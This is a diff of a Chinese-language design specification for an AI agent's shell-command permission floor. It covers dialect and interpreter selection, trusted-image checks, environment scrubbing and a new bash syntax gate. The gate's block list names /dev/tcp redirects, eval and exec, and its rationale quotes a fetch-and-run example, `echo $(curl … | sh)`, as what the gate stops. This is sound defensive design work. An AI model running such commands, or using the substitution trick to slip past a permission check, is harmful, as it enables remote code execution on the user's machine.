+| **BASH-01** | `git_bash` 那一级有一道与 LOWER-02 同强度的语法闸，先于任何命令级规则。body 先按 bash 的引用规则（单引号、双引号、反斜杠）切成简单命令，分隔符是 `;`、`&&`、`\|\|`、`\|`、`\|&`、`&` 与换行，切分失败 ⇒ 不透明。以下任一出现在**任何位置** ⇒ 整段 body 不透明：命令替换 `$(…)` 与反引号；进程替换 `<(…)`、`>(…)`；参数展开 `${…}` 与算术展开 `$((…))`；函数定义；`{ }` 分组与 `( )` 子 shell；关键字 `if` `then` `elif` `else` `fi` `for` `while` `until` `do` `done` `case` `esac` `select` `function` `coproc` `time` `!` `[[`；heredoc `<<` 与 herestring `<<<`；指向 `/dev/tcp`、`/dev/udp` 的重定向；`trap`、`exec`、`eval`（后二者也在 EFF-07）。裸 `$VAR` 仍是 `Dynamic` token，按 TOK-02 | PowerShell 的封闭性一半来自 kind 闸，cmd 的来自 CMD-01；没有这一条，`echo $(curl … \| sh)` 在惰性的 `echo` 上通过封闭集，而代码在 `echo` 之前就跑了 | §3.15、§3.17 |
+
+### 2.14 `CMD` —— cmd 方言
 
 | ID | 规则 | 为什么 | 证据 |
 |---|---|---|---|
@@ -197,12 +207,12 @@ pi-mono `@853a80d26`（2026-08-28）。本文自身不含 `file:line` 引文；�
 
 ```text
 ShellDialect = POSIX | POWERSHELL | CMD | UNKNOWN                      # SPEC-01
-Rung         = pwsh | powershell | cmd | git_bash | system_posix       # SPEC-02
+Rung         = pwsh | powershell | cmd | legacy_cmd | git_bash | system_posix   # SPEC-02；legacy_cmd 仅翻转前（LADDER-05）
 LEGAL_PAIRS  = { POWERSHELL: {pwsh, powershell},
-                 CMD:        {cmd},
+                 CMD:        {cmd, legacy_cmd},
                  POSIX:      {git_bash, system_posix} }                # SPEC-02；其余一律拒绝
 
-ShellSpec {
+ShellSpec {                                   # 不可变（SPEC-07）：每个字段构造时写入，重解析产生新对象
     dialect: ShellDialect
     rung: Rung                                # 构造时按 LEGAL_PAIRS 校验，失败点名配对
     filesystem_is_local: bool = False         # SPEC-04；缺席即 False
@@ -210,30 +220,41 @@ ShellSpec {
     identity_oracle: IdentityOracle | None    # 非本机时由执行器提供（SPEC-05）；测试里注入
     closed_env_established: bool = False      # SPEC-06；IMG-09 写入；PowerShell rung 之外恒 False
     interpreter: InterpreterIdentity | None   # IMG-07；PowerShell rung 才有
-    policy_enabled: bool                      # SPEC-03；= rung != system_posix
+    policy_enabled: bool                      # SPEC-03；= rung ∉ {system_posix, legacy_cmd}
 }
 
 InterpreterIdentity {                         # IMG-07、IMG-08；全部宿主侧读出
-    path: AbsPath                             # 解析出的 launcher
+    path: AbsPath                             # 解析出的 launcher，已规范化（IMG-06）
     edition: str                              # <E>
     version: str                              # <V>
     pshome: AbsPath                           # <H>；安装根，不是 launcher 所在目录
-    session_config: str                       # <C>；生效的控制台会话配置名
+    session_config: str                       # <C>；生效的控制台会话配置名；5.1 没有这个概念（IMG-08）
     launcher_hash: Sha256                     # 预检记录，spawn 前重算
 }
 
-IdentityOracle {                              # IMG-06；四问，宿主侧，可注入
-    subject_can_replace(path, subject) -> bool     # 修改 / 删除 / 替换该路径或其目录
+IdentityOracle {                              # IMG-06；宿主侧，可注入；非本机时是执行器的
+    canonicalize(path) -> AbsPath                  # 8.3、大小写、尾随点空格、\\?\；ADS ⇒ 拒绝
+    subject_can_replace(path, subject) -> bool     # 访问掩码语义见 IMG-06；对一条路径求值，不含祖先
+    resolve_reparse(path) -> AbsPath | None        # junction / symlink / app execution alias 的目标
     resolves_on_target(path) -> bool               # 目标机上解不解析得到
     publisher_trusted(path) -> bool                # 宿主信任的签名
     content_hash(path) -> Sha256
+    target_base_env() -> Env                       # 非本机：目标的基础环境（LAUNCH-01 的 env_delta 施加于此）
+    target_path_entries() -> list[AbsPath]         # 非本机：目标的 PATH 条目（ENV-01 在目标上过滤）
 }
 
+trusted_root_chain(path, subject) =           # IMG-01：映像与到卷根的每一个祖先
+    all(not oracle.subject_can_replace(p, subject)
+        for p in [path] + ancestors_to_volume_root(path))
+    and all(trusted_root_chain(target, subject)              # 链上的 reparse 目标同样要过
+            for target in reparse_targets_along(path))
+
 LaunchRequest =                               # LAUNCH-01
-    PosixLaunch   { executable: AbsPath, argv: list[str], env: Env, cwd: AbsPath }
-  | WindowsLaunch { application_name: AbsPath, command_line: str, env: Env, cwd: AbsPath }
+    PosixLaunch   { executable: AbsPath, argv: list[str], cwd: AbsPath }        # argv 含 sandbox-exec 包装（macOS）
+  | WindowsLaunch { application_name: AbsPath, command_line: str, cwd: AbsPath }
+  with env_delta: EnvDelta { set: dict[str, str], remove: list[KeyPattern] }   # 执行器施加到目标的基础环境
   with execution_subject: Subject
-  with attested_images: list[ResolvedImage]  # 证明步骤解析出的规范映像；执行器只能启动这些
+  with attested_images: list[ResolvedImage]  # 证据，供执行器复核；本机的强制是 ENV-01
 
 ResolvedImage {
     canonical_path: AbsPath
@@ -246,36 +267,41 @@ PublisherTrust{ signer: str }                       # publisher trust：只证�
 
 trusted_image(img, subject, policy) =         # IMG-01 + IMG-02（映像半）+ IMG-03
         oracle.resolves_on_target(img.canonical_path)
-    and not oracle.subject_can_replace(img.canonical_path, subject)
-    and not oracle.subject_can_replace(dirname(img.canonical_path), subject)
+    and trusted_root_chain(img.canonical_path, subject)
     and ((pin := policy.allowlist.entry_for(img.canonical_path)) is None or pin.matches(img))
-        # IMG-03：allowlist 只对它点名的路径附加条件；没点名的映像不因此不可信（G23-05），也不因此可信
+        # IMG-03：allowlist 只对它点名的（规范化后的）路径附加条件；没点名的映像不因此不可信（G23-05），也不因此可信
 
 Token      = Literal(text) | Dynamic(kind)                            # TOK-01
 EffectFlag = rebinds_after | executes_input | rebinds_caller           # EFF-01；空集 = 惰性
-TrustedEntry {
+TrustedEntry {                                # EFF-08：数据，不是代码
     name: str                                 # 归一后的命令词（basename、cmdlet、别名、内建）
     dialect: ShellDialect
     rung_scope: set[Rung]                     # NAME-02 的表按解释器身份分
-    flags(args) -> set[EffectFlag]            # 结合参数判定
+    execution_triggers: list[ArgPattern]      # 命中 ⇒ executes_input（例：git -c core.pager=、python -c）
+    rebind_triggers: list[ArgPattern]         # 命中 ⇒ rebinds_after
+    caller_scope: bool                        # 为真时 rebinds_after 同时是 rebinds_caller
     predicate_positions: set[int]             # EFF-06：这些位置 Dynamic ⇒ 不透明
+    source: str                               # 每条断言的出处
 }
+flags(entry, args) = { executes_input if any(p.matches(args) for p in entry.execution_triggers) }
+                   | { rebinds_after  if any(p.matches(args) for p in entry.rebind_triggers) }
+                   | { rebinds_caller if rebinds_after ∈ that and entry.caller_scope }
 
 PermissionRule.dialect = "posix" | "cmd" | "powershell" | "*" | absent   # TOOL-02；absent = unspecified
 PermissionConfig { rules, sources, shell: ShellBlock }                  # CFG-03；不可变
 ShellBlock {                                                            # 用户级 shell 块 / 构造 spec（CFG-02）
-    path: AbsPath | None                      # IMG-05 (b)
+    path: AbsPath | None                      # IMG-05 (b)：免签名，不免位置
     dialect: ShellDialect | None
     allow_git_bash: bool = False              # LADDER-02
     allowlist: list[HashPin | PublisherTrust] = []   # IMG-03
 }
 
-ChildEnv(rung) = scrubbed_base_env            # 已剥离 provider 凭据的基础环境
-    PATH     = filtered_path(execution_subject)              # ENV-01
+ChildEnv(rung) = base + delta                 # 本机 base = 剥离 provider 凭据的进程环境；非本机 base = oracle.target_base_env()
+    PATH     = filtered_path(execution_subject, path_entries)   # ENV-01；非本机的 path_entries 来自 oracle
     PATHEXT  = ".COM;.EXE"                                   # ENV-02（每一级）
     remove   BASH_ENV, ENV, BASH_FUNC_*                      # ENV-03（每一级）
     NoDefaultCurrentDirectoryInExePath = "1"                 # ENV-04（cmd）
-    PSModulePath = pinned                                    # ENV-05（pwsh / powershell）
+    PSModulePath = pinned                                    # ENV-05（pwsh / powershell）；只含 IMG-01 目录
     MSYS_NO_PATHCONV = "1"                                   # LAUNCH-04（git_bash）
 ```
 
@@ -287,6 +313,7 @@ ChildEnv(rung) = scrubbed_base_env            # 已剥离 provider 凭据的基�
 | `hardline:unknown-rung-opaque` | SPEC-02 |
 | `hardline:no-trusted-rung-opaque` | LADDER-03 |
 | `hardline:<dialect>-opaque:<原因>` —— `<原因>` 是 LOWER-01 的步骤号、或产生不透明的规则 ID、或 IMG-02 的哪一半 | 其余每一种不透明 |
+| `hardline:<dialect>-opaque:launch-<原因>` —— `oversize`、`rehash`、`reread` | 启动阶段的拒绝：LAUNCH-08、IMG-07、IMG-08（LAUNCH-01 规定它走地板的 DENY 通道） |
 | `hardline:<class> …` | 危险表命中：§3.5 的 18 类与 §3.6 的 Windows 类，与今天的拼法相同 |
 
 ---
@@ -305,13 +332,16 @@ floor(spec: ShellSpec, body: str) -> Verdict:
     if spec.rung == EXHAUSTED:
         return DENY("hardline:no-trusted-rung-opaque")                    # LADDER-03
 
-    if not spec.policy_enabled:                                           # SPEC-03：system_posix
-        return todays_posix_floor(body)      # 今天的 18 类 regex 地板，含 §2.7 记录的 fail-open；
-                                             # 不查表、不打标志、不检查映像 —— 直到 q4 定案
+    if not spec.policy_enabled:                                           # SPEC-03：system_posix / legacy_cmd
+        return todays_floor(body)            # 今天的 18 类 regex 地板，含 §2.7 记录的 fail-open 与 §2.4 的空转；
+                                             # 不查表、不打标志、不检查映像 —— 直到 q4 定案 / PR-7 删除 legacy_cmd
+    if len(command_line_for(spec, body)) > platform_limit(spec):
+        return DENY(opaque(LAUNCH-08, "launch-oversize"))                  # 分析之前，绝不截断
 
     commands = analyse(spec.dialect, body)
         # CMD：regex + Token 化；任何位置的任何 Dynamic ⇒ 不透明（TOK-02）；控制流与分组 ⇒ 不透明（CMD-01）
-        # POSIX（git_bash）：今天的 regex 地板 + Token 化（TOK-01）
+        # POSIX（git_bash）：BASH-01 —— 按 bash 引用规则切简单命令，任何代码承载的展开或复合构造 ⇒ 整段不透明；
+        #   然后今天的 regex 地板 + Token 化（TOK-01）
         # POWERSHELL：LOWER-01 的十步；任一步失败 ⇒ DENY("hardline:powershell-opaque:<步骤>")
         #   —— `& …` / `. …` 的 command_name_expr 形式在第 5 步就已不透明，到不了下面的 WRAP-04
     if commands is OPAQUE: return DENY(commands.reason)
@@ -341,7 +371,7 @@ floor(spec: ShellSpec, body: str) -> Verdict:
 
 **顺序为什么是这个顺序。** 方言与 rung 的两道 fail-closed 检查在任何分析之前（SPEC-01、SPEC-02）；`policy_enabled`
 的闸在任何查表之前，因为 `system_posix` 的每一次查表都是一次 Linux 上的行为变更（SPEC-03）；
-LOWER-01 在任何命令级规则之前，因为第 4、5、8 步拒掉的东西从不形成命令；`rebinds_after` 的检查在循环
+LAUNCH-08 的长度守卫在分析之前，因为截断后的结构不是被分析的结构；LOWER-01 与 BASH-01 在任何命令级规则之前，因为它们拒掉的东西从不形成命令；`rebinds_after` 的检查在循环
 顶部，因为它说的是**后继**；`executes_input` 在标志判定之后，因为它说的是**自身**。
 
 ---
@@ -351,12 +381,14 @@ LOWER-01 在任何命令级规则之前，因为第 4、5、8 步拒掉的东西
 ```text
 select_rung(config: ShellBlock | ConstructorSpec) -> ShellSpec | EXHAUSTED:   # CFG-02、LADDER-01
     if config.path is not None or config.dialect is not None:            # 这个来源给出了整份 spec（CFG-02）
-        return build_spec(config)                            # SPEC-02 校验；IMG-05 (b) 对 shell.path
+        if config.path is not None and not trusted_root_chain(canonicalize(config.path), subject):
+            return REFUSED                                   # IMG-05 (b)：免签名，不免位置（IMG-01）
+        return build_spec(config)                            # SPEC-02 校验
     # 只带 allow_git_bash / allowlist 的块不是整份 spec：它参数化 auto，阶梯照跑
     for rung in [pwsh, powershell, (git_bash if config.allow_git_bash), cmd]:   # LADDER-02
         img = discover(rung)                                 # IMG-05 (a)：已知安装位置；PATH 命中不是候选
         if img is None: continue
-        if not trusted_root(dirname(img), subject): continue                    # IMG-01
+        if not trusted_root_chain(img, subject): continue                        # IMG-01：映像与每一个祖先
         if not host_identity_ok(img): continue                                  # IMG-05：签名 或 path+hash
         if rung ∈ {pwsh, powershell}:
             if parser is None: continue                                         # LADDER-01
@@ -381,6 +413,7 @@ launch(spec, body) -> LaunchRequest:                                            
 | `powershell` | 同上；表按 edition 分（NAME-02） | 同上 | 同上 | 同上 | 开 | G10、G21 |
 | `git_bash` | IMG-05；仅当 `allow_git_bash`（LADDER-02） | G20 绿（LADDER-04） | LAUNCH-04 | ENV-01、ENV-02、ENV-03 | 开 | G07、G11、G20 |
 | `cmd` | IMG-05；每个受支持的 Windows 都有 | IMG-01 与 IMG-05 通过（`cmd` 也可能被拒） | LAUNCH-03 | ENV-01、ENV-02、ENV-03、ENV-04 | 开 | G06、G10、G18 |
+| `legacy_cmd` | 翻转前的 Windows 默认（LADDER-05）；不是阶梯的一级 | — | `%COMSPEC% /c`，今天的启动 | 今天的环境 | **关**（PR-7 删除） | G10、G11 |
 | `system_posix` | 现有 POSIX 主机的那个 shell | — | 今天的启动 | 今天的环境 | **关**（q4） | G07 |
 | *（走空）* | 每一级被拒 | — | 不启动 | — | — | G25 |
 
@@ -402,6 +435,8 @@ launch(spec, body) -> LaunchRequest:                                            
   拿到父级的引擎与配置快照（SUB-01、ENG-04）；G13 断言快照抵达每个 root，G13b（子代理计划）断言子代理
   持有的是父级那一份。
 
+- **hooks 计划的 G8：`PreToolUse` 可以改写输入，而已被引擎拒绝的调用仍会触发 hook。** 地板的裁定必须落在改写后的**最终**文本上：改写成不透明文本的调用 DENY，改写成放行文本的调用不得沿用改写前的裁定（G08-02）。
+
 MCP 的取消（MCP-04）与本规范无交集：shell 工具不是 MCP 工具，它的终止走 `LocalShellExecutor` 与 `kill_process_tree` 的进程树 kill。
 
 ---
@@ -412,6 +447,7 @@ MCP 的取消（MCP-04）与本规范无交集：shell 工具不是 MCP 工具�
 
 - **一个 `powershell` 工具。** **`cmd` 在 PowerShell 之上。** **macOS/Linux 上的 PowerShell。**
 - **审计任何地板没有降级的文件。**
+- **审计可信工具链按设计执行的工作树内容** —— `git` 的 hooks、`npm`/`cargo`/`make`/`pytest` 的脚本与配置。封闭集保证的是**启动的程序**可信（EFF-01 的惰性定义只说命令行），不保证那个程序之后跑的代码可信；后者是 18 类地板之外的产品目的。
 - **为 shell、裸词、子进程或启动文件解析信任任何工作区文件或二进制。**
 - **在 agent 之间共享工具实例或 MCP 工具对象** —— 共享能力与作用域视图，绝不共享对象（子代理计划）。
 - **子代理专属的权限模式。** **`rebind()` API。**
@@ -462,6 +498,6 @@ MCP 的取消（MCP-04）与本规范无交集：shell 工具不是 MCP 工具�
     Python、scoop 的 shim —— 它们**按设计**就装在用户可写的前缀下 —— 进不了可信集：过滤后的 PATH 会丢掉
     它们的目录，而 allowlist 也不再能单独成立。可选项是：宿主把它们装到「该 agent 主体写不了」的根下；
     由用户做一次逐路径的显式信任授权，就像 `shell.path` 对解释器那样 —— 那是**照 IMG-05 (b) 档形状写的、
-    有文档的例外**，不是进入可信集的第二条路，而且它同样带着那处 TOCTOU，明说出来、不是默默继承；或者
+    有文档的例外**，不是进入可信集的第二条路，而且它同样带着那处 TOCTOU，明说出来、不是默默继承；注意 (b) **不免位置**（IMG-05），所以这个选项对用户可写前缀里的工具链同样不成立，除非它明写「免位置」并把加载闭包落在主体可写目录里的后果一并接受；或者
     接受这次拒绝。在开发者自己的机器上，这几乎就是他跑的全部东西，所以这是一个有用户可见答案的决定，
     不是一条脚注。
